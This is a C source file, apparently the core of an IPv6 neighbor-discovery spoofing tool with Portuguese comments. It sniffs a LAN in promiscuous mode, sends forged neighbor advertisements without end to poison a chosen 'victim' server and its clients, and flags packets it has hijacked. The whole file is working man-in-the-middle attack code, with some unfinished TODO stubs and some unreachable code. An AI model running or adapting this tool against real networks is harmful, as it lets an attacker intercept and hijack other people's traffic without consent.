#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#include <sys/socket.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

#include <netinet/if_ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>

#include <device.h>
#include <packets.h>
#include <communication.h>

#define DEBUG 0


int sniff;

void termination_handler(int signum) {
	/* TODO */
	printf("\nSig: %d\nFree everything\n", signum);
	close(sniff);
	free(cvictim); //FIXME: free all the attributes??
	exit(0);
}

void poison(struct victim *dst) {
	int i;
	char *pkt;

	printf("Setting up Client poisoning\n");
	pkt = alloc_ndadvert(&svictim, dst);

	//for (i = 0; i < 1000; i++) {
	for (;;) {
		send_icmpv6(&(dst->ipv6), pkt);
		sleep(1);
	}

	free(pkt);
	printf("Client poisoned\n");

	printf("Setting up Server poisoning\n");
	pkt = alloc_ndadvert(dst, &svictim);

	for (i = 0; i < 1000; i++) {
		send_icmpv6(&svictim.ipv6, pkt);
	}

	free(pkt);
	printf("Server poisoned\n");
}

void populate_cvictim(char *pkt) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;

	eth = (struct ethhdr *)pkt;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	printf("Populando CVICTIM\n");

	cvictim = (struct victim *)malloc(sizeof(struct victim));
	memcpy(&(cvictim->ipv6), &(ip6->ip6_src), sizeof(struct in6_addr));
	memcpy(&(cvictim->hwaddr), &(eth->h_source), ETH_ALEN);

	debug_cvivtim(cvictim);
	poison(cvictim);
}

void packet_action(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct tcphdr *tcp;
	struct nd_neighbor_solicit *nd;

	debug_packet(packet);

	eth = (struct ethhdr *)packet;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));


	switch (ip6->ip6_nxt) {
		case IPPROTO_ICMPV6:
			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			/* Se for uma solicitação de discover e o cliente ainda não foi
			 * "poisoned", dispara o poison. */
			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
				nd = (struct nd_neighbor_solicit *)icmpv6;
				if (!memcmp(&nd->nd_ns_target, &svictim.ipv6, sizeof(struct in6_addr))) {
					/* TODO */
					printf("Thread de poison para o client.\n");
					/* Sempre que o client enviar um solicitation a gente vai
					 * envenenar ambas as partes */
					poison(cvictim);
				}
			}
			break;
	}

	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
		/* Pacote para nossa vitima. */
		/* Por enquanto é apenas suportado 1 cliente */
		if (!cvictim)
			/* já faz o primeiro poison só prá deixar de ser otário */
			populate_cvictim(packet);

		/* Se o mac destino for o do atacante, é pacote roubado */
		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
			printf("Packet Hijacked? :-)\n");
			debug_packet(packet);
			/* TODO */
			switch (ip6->ip6_nxt) {
				case IPPROTO_ICMPV6:
					icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
					break;
				case IPPROTO_TCP:
					tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
					break;
				default:
					break;
			}
		}
	} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
		/* Pacote enviado pela nossa vitima. */
		switch (ip6->ip6_nxt) {
			case IPPROTO_ICMPV6:
				icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
				if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
					if (memcmp(&svictim.hwaddr, &eth->h_source, ETH_ALEN) != 0) {
						memcpy(&(svictim.hwaddr), &(eth->h_source), ETH_ALEN);
						printf("Gotcha: %s\n", ether_ntoa(&svictim.hwaddr));
					}
				}
				break;
			case IPPROTO_TCP:
				tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
				/* TODO */
				break;
		}
	}

#if 0
		cli = get_cvictim(eth);

		printf("\e[32mDebug Cliente\n");
		debug_cvivtim(&cli->cv_victim);
		printf("Debug Vitima\n");
		debug_cvivtim(&svictim);
		printf("\e[0m");

		if (pthread_create(&(cli->th), 0, &poison_vclient, cli)) {
			printf("Error creating thread\n");
			//printf("Client: %s", );
		}
	}
#endif
}

int main(int argc, char **argv) {
	struct sockaddr_ll packet_info;
	struct sigaction saction;
	char packet_buffer[2048], *pkt;
	int len;
	int packet_info_size = sizeof(packet_info);

	/* Set up the structure to specify the new action. */
	saction.sa_handler = termination_handler;
	sigemptyset(&saction.sa_mask);
	saction.sa_flags = 0;

	sigaction(SIGINT, &saction, NULL);

	if (argc < 3) {
		printf("Usage: %s <interface> <victim's address>\n", argv[0]);
		exit(0);
	}

	load_device_info(argv[1]);
	dump_device_info();

	sniff = get_promisc_socket(device.name);
	init_svictim(argv[2]);
	init_cvictim();

	/* Begin Teste */
	pkt = alloc_ndsolicit(&svictim.ipv6);
	send_icmpv6(&svictim.ipv6, pkt);

	if (pkt)
		free(pkt);
	/* End Teste */

	while ((len = recvfrom(sniff, packet_buffer, 2048, 0,
						(struct sockaddr*)&packet_info,
						(socklen_t *)&packet_info_size)) >= 0) {

			//debug_packet((char *)packet_buffer + sizeof(struct ethhdr *));
			packet_action(packet_buffer);
	}

	return 0;
}
